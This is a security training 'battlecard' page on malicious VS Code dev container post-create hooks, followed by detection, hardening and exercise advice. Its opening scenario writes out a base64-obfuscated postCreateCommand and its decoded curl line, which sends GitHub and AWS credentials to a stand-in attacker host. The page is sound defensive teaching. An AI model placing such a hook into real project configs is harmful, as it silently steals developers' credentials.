---
 permalink: /battlecards/dev-container-post-create-hooks
 
battlecard:
 title: Dev Container Post-Create Hooks
 category: Developer Environment
 scenario: Dev Containers / Post-Create Hooks
 focus: 
   - VS Code DevContainer postCreateCommand 
   - malicious devfiles 
   - token exfiltration 
---

An attacker creates a public GitHub repository, "Awesome-AI-Boilerplate," positioning it as a starter template for a popular Python framework with integrated AI tooling. The repository is well-documented and looks legitimate. However, hidden within the `.devcontainer/devcontainer.json` file is a malicious `postCreateCommand`.

The command is obfuscated using base64 to avoid casual inspection:
`"postCreateCommand": "echo 'Y3VybCAtcyAtWCBQT1NUIC1kICJ0b2tlbj0kR0lUSFVCX1RPS0VOJmF3cz0kQVdTX0FDQ0VTU19LRVlfSUQiIGh0dHBzOi8vYXR0YWNrZXItY2FsbGJhY2suY29tL2xvZw==' | base64 --decode | bash"`

When an unsuspecting developer clones the repository and opens it in VS Code with the Dev Containers extension, the hook executes automatically upon container creation. The decoded command is:
`curl -s -X POST -d "token=$GITHUB_TOKEN&aws=$AWS_ACCESS_KEY_ID" https://attacker-callback.com/log`

This command silently captures the developer's `GITHUB_TOKEN` and `AWS_ACCESS_KEY_ID` from the container's environment and sends them to the attacker's server. The developer notices nothing, as their environment finishes building and appears to work perfectly. The attacker now has credentials to access the developer's GitHub repositories and AWS account.

{% block type='battlecard' text='Reconnaissance' %}
### Explanation
The attacker's goal is to create an attractive lure for developers. They aren't targeting a specific company but are casting a wide net, knowing that developer environments are often rich with valuable credentials. Their tactics are based on social engineering and exploiting the developer's trust in community tools. They will research popular frameworks, libraries, and development trends (e.g., AI/ML, Rust, FastAPI) to build a template that developers are likely to seek out. The attack itself is simple, relying on the automated, "zero-config" nature of modern dev environments to execute the malicious payload without user interaction.

### Insight
This is a supply chain attack that targets the developer's "inner loop" – their local development environment. Attackers understand that developers trust configuration files (`devcontainer.json`, `package.json`, `Makefile`) more than they trust binary executables. The convenience of these tools creates a powerful blind spot.

### Practical
As a developer, assume any new, third-party repository is untrusted until proven otherwise. Before you open a project in a tool that automatically executes code or configuration (like Dev Containers), manually inspect the configuration files. Look for any lifecycle scripts or hooks (`postCreateCommand`, `postAttachCommand`, etc.) that run commands, especially those that are obfuscated or download external content.

### Tools/Techniques
*   **Social Engineering:** Promoting the malicious repository on platforms like Reddit (`/r/programming`), Hacker News, or Twitter to build legitimacy.
*   **Obfuscation:** Using techniques like base64 encoding, URL shorteners, or splitting commands across multiple lines to hide the malicious payload within the `devcontainer.json` file.
*   **Command Line Inspection:** Using tools like `cat`, `less`, and `jq` to inspect configuration files before letting an IDE parse them. Example: `cat .devcontainer/devcontainer.json | jq .postCreateCommand`

### Metrics/Signal
*   **Suspicious Popularity:** A new project template that gains an unusual number of stars or forks very quickly, potentially driven by bot accounts.
*   **Obfuscated Commands:** The presence of base64 encoded strings, `eval` statements, or `curl | bash` patterns in any project configuration or bootstrap script is a major red flag.

{% endblock %}
{% block type='battlecard' text='Evaluation' %}
### Explanation
Assess your vulnerability by examining your personal and team habits around adopting new code. Do you clone and immediately run projects from unfamiliar sources? Does your team have a process for vetting new development tools or starter kits? The key vulnerability is the implicit trust placed in configuration files. Evaluate what credentials are automatically available in your shell environment. If a `postCreateCommand` runs, what secrets would it find just by running `env`?

### Insight
Your personal development environment is part of your organization's attack surface. A compromise of your local machine can be a pivot point into your company's cloud infrastructure, source code, and other critical systems. The convenience of having `AWS_ACCESS_KEY_ID` in your `.bashrc` becomes a significant liability.

### Practical
1.  **Audit your Environment:** Open a terminal and run `env | grep -i "TOKEN\|KEY\|SECRET"` to see what sensitive variables are exposed in your default shell.
2.  **Review Team Practices:** Ask your team: "What is our policy for using open-source project templates?" If there isn't one, start a discussion to create one.
3.  **Inspect Your Tools:** Check your VS Code settings. The Dev Containers extension, for example, will prompt you to trust a repository before reopening it, but the initial "Open in Container" action often proceeds with implicit trust. Be aware of this flow.

### Tools/Techniques
*   **Manual Code Review:** The most basic and effective tool is your own critical eye. Read the `devcontainer.json` and any referenced `Dockerfile` or shell scripts before building the container.
*   **Environment Auditing:** Simple shell commands like `env` or `printenv` are sufficient for a quick audit.

### Metrics/Signal
*   **Credential Exposure:** The number of long-lived, highly-privileged tokens found in your default shell environment. Aim for zero.
*   **Process Gaps:** The lack of a documented team policy for vetting third-party developer environment configurations.

{% endblock %}
{% block type='battlecard' text='Fortify' %}
### Explanation
Harden your environment by reducing the implicit trust given to project configurations and by applying the principle of least privilege to your credentials. The goal is to make your development environment "safe by default," where running untrusted code doesn't immediately lead to a catastrophic breach. This involves both changing practices (manual vetting) and leveraging tools to manage credentials more securely.

### Insight
Treat configuration-as-code with the same skepticism as application code. A `devcontainer.json` or `Dockerfile` from an untrusted source should go through a review process, just like a pull request from an unknown contributor. The best defense is to ensure there are no valuable secrets to steal in the first place.

### Practical
*   **Vet All Configs:** Institute a team-wide practice to always manually review `devcontainer.json`, `devfile.yaml`, `Dockerfile`, and other setup scripts from untrusted repositories before opening them.
*   **Adopt Just-in-Time Credentials:** Instead of storing long-lived tokens in `.bashrc` or `.env` files, use tools that generate or retrieve temporary credentials only when needed. For example, use your cloud provider's CLI to log in and create a temporary session.
*   **Use Curated Base Images:** For teams, maintain a set of approved and scanned base images for dev containers, reducing the reliance on potentially compromised images from public registries.

### Tools/Techniques
*   **[GitHub CLI](https://cli.github.com/)**: Use `gh auth login` to manage your GitHub token. This stores the token in a secure keychain and not in a plaintext file or environment variable.
*   **[AWS Vault](https://github.com/99designs/aws-vault)**: A tool to securely store and access AWS credentials in your development environment, providing them to shells and applications on demand.
*   **[HashiCorp Vault](https://www.vaultproject.io/)**: A comprehensive secrets management solution that can provide secrets and short-lived credentials to applications and developers.
*   **[Open Policy Agent (OPA)](https://www.openpolicyagent.org/)**: Can be used in a CI pipeline to lint and reject `devcontainer.json` files that contain suspicious patterns like `curl | bash`.

### Metrics/Signal
*   **Secret-Free Environments:** A successful scan of developer shell configuration files (`.bashrc`, `.zshrc`, etc.) shows no hardcoded secrets or tokens.
*   **Policy Enforcement:** A pull request is automatically blocked by a CI check because it adds a risky command to a `devcontainer.json` file.

{% endblock %}
{% block type='battlecard' text='Limit' %}
### Explanation
Assume the attacker successfully executes their `postCreateCommand` and exfiltrates a token. The damage they can do is determined by the permissions of that token. If you followed the principle of least privilege, the blast radius is small. If the stolen `GITHUB_TOKEN` was a classic Personal Access Token with full `repo` and `admin:org` scopes, the attacker could exfiltrate source code or add malicious users to your organization. If it was a fine-grained token with only `read:packages` scope and a 1-hour expiry, the damage is negligible.

### Insight
The single most important factor in limiting the damage of a credential theft is the scope and lifetime of the stolen credential. A short-lived, narrowly-scoped token turns a potential disaster into a low-severity incident.

### Practical
*   **Use Fine-Grained Tokens:** When creating a Personal Access Token on GitHub, always use the [Fine-Grained PATs](https://github.blog/2022-10-18-introducing-fine-grained-personal-access-tokens/). Only grant the specific permissions required for your task (e.g., `read` access to a single repository) and set the expiration to the shortest practical duration (e.g., 7 days).
*   **Leverage Cloud IAM:** For cloud credentials, use IAM roles that grant the minimum necessary permissions for your development task. Use your cloud provider's SSO or session manager to obtain temporary credentials that expire automatically.
*   **Network Egress Filtering:** In a corporate setting, configure firewall or proxy rules that prevent developer workstations or containers from making outbound connections to unknown or untrusted IP addresses, which would block the exfiltration `curl` command.

### Tools/Techniques
*   **[GitHub Fine-Grained Personal Access Tokens](https://github.com/settings/tokens?type=beta)**: The standard for creating least-privilege GitHub tokens.
*   **[AWS IAM Identity Center (SSO)](https://aws.amazon.com/iam/identity-center/)**: The recommended way for developers to get temporary, role-based credentials for accessing AWS.
*   **[Docker Desktop Hardened Desktop](https://www.docker.com/products/docker-desktop/hardened-desktop/)**: Includes features that can help organizations enforce security policies, including network controls.

### Metrics/Signal
*   **Token Scope Audit:** An audit of active Personal Access Tokens in your GitHub organization shows that >90% are fine-grained and have an expiration date set.
*   **Blocked Network Connection:** A log entry from a network firewall or proxy showing a denied outbound connection from a dev container to an unknown domain. This is a strong signal that an exfiltration attempt was stopped.

{% endblock %}
{% block type='battlecard' text='Expose' %}
### Explanation
Detecting an active attack requires monitoring and logging at multiple levels. The earliest sign might be a network alert for an outbound connection to a suspicious domain. After the fact, you might get an alert from a service like GitHub's secret scanning if the attacker uses the stolen token publicly. You can also proactively hunt for threats by logging and analyzing shell commands executed within dev containers and monitoring cloud API logs for anomalous behavior (e.g., API calls from an unexpected IP address or region).

### Insight
Detection is layered. You can't rely on a single signal. You need visibility into the network, the container's runtime behavior, and the activity of your cloud accounts. The goal is to have multiple tripwires, so if one fails, another can catch the malicious activity.

### Practical
*   **Enable Cloud Audit Logs:** Ensure services like AWS CloudTrail or Azure Monitor are enabled and configured to log all API activity. Set up alerts for high-risk actions or anomalous patterns.
*   **Enable Secret Scanning:** Ensure GitHub's [secret scanning](https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning) is enabled for your organization. This is a critical safety net.
*   **Centralize Shell Logs:** For sensitive environments, consider using tooling to forward shell history from within dev containers to a centralized logging system (like a SIEM) for analysis.

### Tools/Techniques
*   **[AWS CloudTrail](https://aws.amazon.com/cloudtrail/)**: Provides a complete audit trail of all API calls made in your AWS account. Can be configured with CloudWatch Alarms to flag suspicious activity.
*   **[Falco](https://falco.org/)**: A CNCF open-source tool for runtime threat detection. It can be deployed to a Kubernetes cluster or a local machine to monitor container activity and alert on rules like "Outbound connection to non-allowed domain."
*   **[GitGuardian](https://www.gitguardian.com/)**: A commercial platform that provides advanced secret scanning and can monitor for leaks across the public internet.

### Metrics/Signal
*   **CloudTrail Alert:** An email or Slack alert fires because a developer's AWS access key was just used from an IP address in an unexpected country.
*   **GitHub Secret Scanning Alert:** You receive a notification that a token associated with your organization was found in a public repository or gist.
*   **Falco Alert:** `Notice: Network connection to untrusted domain (user=devuser command=curl ... container=my-dev-container)`.

{% endblock %}
{% block type='battlecard' text='eXercise' %}
### Explanation
To build resilience, you must practice your response. Security exercises turn theoretical knowledge into practical skill. Run controlled simulations of this attack to test your defenses, processes, and people. These exercises build "muscle memory" for both developers and security teams, making the correct, secure response second nature.

### Insight
A security policy is only effective if people know how to follow it under pressure. Regular, low-stakes exercises are the best way to educate developers on threats and validate that your defensive tools and processes actually work as expected.

### Practical
*   **Tabletop Exercise:** Gather the development team and walk through the scenario. Ask questions: "You've cloned this repo. What is the first thing you do?" "You see a base64 string in the `postCreateCommand`. What's your next step?" "Who do you report this to?"
*   **Red Team Simulation:** Create a private, benign "malicious" repository and challenge a developer or team to vet it. Their goal is to follow the team's security process to identify and report the fake `postCreateCommand` without running it. Track how long it takes them.
*   **Capture the Flag (CTF):** Simulate a successful breach. Provide the team with a set of mock logs (network logs, CloudTrail, shell history) and challenge them to perform incident response: identify the compromised key, determine what the attacker accessed, and outline the correct remediation steps (revoke, rotate, report).

### Tools/Techniques
*   **Internal Documentation:** Use a wiki (e.g., Confluence, GitHub Wikis) to document the security vetting process and the incident response plan. The exercise will reveal gaps in this documentation.
*   **Dedicated Slack Channel:** Create a `#security-incidents` channel for reporting suspicious activity, and use it during the simulation.
*   **[Gitleaks](https://github.com/gitleaks/gitleaks)**: While primarily a pre-commit scanner, you can use it to create educational exercises where developers need to find secrets "hidden" in a codebase.

### Metrics/Signal
*   **Time to Detection:** In a simulation, the time elapsed between the developer cloning the repo and reporting the malicious hook. A decreasing trend over time shows improved awareness.
*   **Process Improvement:** The number of concrete improvements made to documentation, tooling, or alerting rules as a direct result of an exercise.
*   **Increased Reporting:** An increase in developers proactively reporting suspicious configurations or other security concerns, indicating a healthy security culture.
{% endblock %}